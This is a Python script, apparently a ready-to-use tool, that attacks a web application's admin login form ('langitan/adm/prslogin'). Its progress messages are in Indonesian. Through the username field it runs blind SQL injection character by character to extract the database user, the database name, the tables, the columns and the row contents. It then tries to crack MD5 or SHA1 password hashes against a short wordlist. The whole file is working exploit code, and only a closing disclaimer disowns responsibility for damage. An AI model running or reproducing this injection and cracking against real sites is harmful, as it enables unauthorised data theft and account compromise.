import requests
import sys
import hashlib

url = "http://192.168.56.2/langitan/adm/prslogin" # Change with url of vulnerable form page
session = requests.Session()

# Function to get the current user
def get_current_user():
    print("[+] Menebak current_user():")
    current_user = ""
    for i in range(1, 30):
        found = False
        for c in range(0x20, 0x7f):
            username = f"abc' OR BINARY substring(current_user(), {i}, 1) = '{chr(c)}' -- -"
            form = {'user': username, 'password': '123'}
            response = session.post(url, data=form)

            if "Menu Utama" in response.text or "admin" in response.text:
                sys.stdout.write(chr(c))
                sys.stdout.flush()
                current_user += chr(c)
                found = True
                break
        if not found:
            break
    print(f"\n[+] Current User: {current_user}")
    return current_user

# Function to get the database
def get_database():
    print("\n[+] Menebak nama database:")
    database_name = ""
    for i in range(1, 30):
        found = False
        for c in range(0x20, 0x7f):
            username = f"abc' OR BINARY substring(database(), {i}, 1) = '{chr(c)}' -- -"
            form = {'user': username, 'password': '123'}
            response = session.post(url, data=form)

            if "Menu Utama" in response.text or "admin" in response.text:
                sys.stdout.write(chr(c))
                sys.stdout.flush()
                database_name += chr(c)
                found = True
                break
        if not found:
            break
    print(f"\n[+] Database ditemukan: {database_name}")
    return database_name

# Function to get the tabels
def get_tables():
    print("\n[+] Menebak nama tabel:")
    all_tables = []
    for table_index in range(0, 30):
        table_name = ""
        for char_index in range(1, 50):
            found = False
            for c in range(0x20, 0x7f):
                username = f"abc' OR BINARY substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {table_index},1), {char_index}, 1) = '{chr(c)}' -- -"
                form = {'user': username, 'password': '123'}
                response = session.post(url, data=form)

                if "Menu Utama" in response.text or "admin" in response.text:
                    sys.stdout.write(chr(c))
                    sys.stdout.flush()
                    table_name += chr(c)
                    found = True
                    break
            if not found:
                break
        if table_name != "":
            all_tables.append(table_name)
        else:
            break
    print("\n\n[+] Daftar Tabel:")
    for idx, tbl in enumerate(all_tables):
        print(f"{idx+1}. {tbl}")
    return all_tables

# Function to choose the tables
def select_table(all_tables):
    selected_idx = input("\n[INPUT] Masukkan nomor tabel yang ingin diambil kolom & isinya: ")
    try:
        selected_idx = int(selected_idx) - 1
        target_table = all_tables[selected_idx]
    except (ValueError, IndexError):
        print("Nomor tidak valid.")
        sys.exit(1)

    print(f"\n[+] Tabel terpilih: {target_table}")
    return target_table

# Function to get the column
def get_columns(target_table):
    print(f"\n[+] Menebak kolom pada tabel '{target_table}':")
    all_columns = []
    for column_index in range(0, 10):
        column_name = ""
        for char_index in range(1, 50):
            found = False
            for c in range(0x20, 0x7f):
                username = f"abc' OR BINARY substring((SELECT column_name FROM information_schema.columns WHERE table_name='{target_table}' LIMIT {column_index},1), {char_index}, 1) = '{chr(c)}' -- -"
                form = {'user': username, 'password': '123'}
                response = session.post(url, data=form)

                if "Menu Utama" in response.text or "admin" in response.text:
                    sys.stdout.write(chr(c))
                    sys.stdout.flush()
                    column_name += chr(c)
                    found = True
                    break
            if not found:
                break
        if column_name != "":
            all_columns.append(column_name)
        else:
            break
    print(f"\n\n[+] Kolom ditemukan: {all_columns}")
    return all_columns

# Function to display the data
def get_table_data(target_table, all_columns):
    print(f"\n[+] Menampilkan data dari tabel '{target_table}':")
    rows = []
    for row_index in range(0, 10):
        row_data = {}
        stop_row = False
        for column in all_columns:
            cell_data = ""
            for char_index in range(1, 100):
                found = False
                for c in range(0x20, 0x7f):
                    username = f"abc' OR BINARY substring((SELECT {column} FROM {target_table} LIMIT {row_index},1), {char_index}, 1) = '{chr(c)}' -- -"
                    form = {'user': username, 'password': '123'}
                    try:
                        response = session.post(url, data=form)
                    except Exception as e:
                        print("Error:", e)
                        continue

                    if "Menu Utama" in response.text or "admin" in response.text:
                        sys.stdout.write(chr(c))
                        sys.stdout.flush()
                        cell_data += chr(c)
                        found = True
                        break
                if not found:
                    break
            if cell_data == "":
                stop_row = True
                break
            row_data[column] = cell_data
        if stop_row:
            break
        rows.append(row_data)

    print("\n")
    for idx, row in enumerate(rows):
        print(f"Row {idx + 1}: {row}")
    return rows

# Function to crack the password (if there's a password)
def crack_password(rows, all_columns):
    if "password" in all_columns:
        print("\n[+] Mencoba crack hash pada kolom 'password' menggunakan wordlist...")
        wordlist = ["admin", "123456", "password", "admin123", "root", "letmein"] # you can change with external wordlist

        for idx, row in enumerate(rows):
            hashed_pass = row.get("password")
            if not hashed_pass:
                continue

            cracked = False
            for word in wordlist:
                if hashlib.md5(word.encode()).hexdigest() == hashed_pass:
                    print(f"Row {idx + 1} password cracked (MD5): {word}")
                    cracked = True
                    break
                if hashlib.sha1(word.encode()).hexdigest() == hashed_pass:
                    print(f"Row {idx + 1} password cracked (SHA1): {word}")
                    cracked = True
                    break
            if not cracked:
                print(f"Row {idx + 1} password not cracked: {hashed_pass}")
    else:
        print("\n[-] Tidak ada kolom 'password' di tabel ini.")

# Main loop for selecting and viewing tables
def main_loop():
    get_current_user()
    get_database()

    while True:
        all_tables = get_tables()
        target_table = select_table(all_tables)
        all_columns = get_columns(target_table)
        rows = get_table_data(target_table, all_columns)
        crack_password(rows, all_columns)

        again = input("\n[INPUT] Ingin memilih tabel lain? (y/n): ").lower()
        if again != 'y':
            print("[+] Exiting...")
            break

if __name__ == "__main__":
    main_loop()


# Use it wisely, i'm not responsible for any damage or loss.
# Copyright Melkorxr. See another project on my github (github.com/Melkorxr).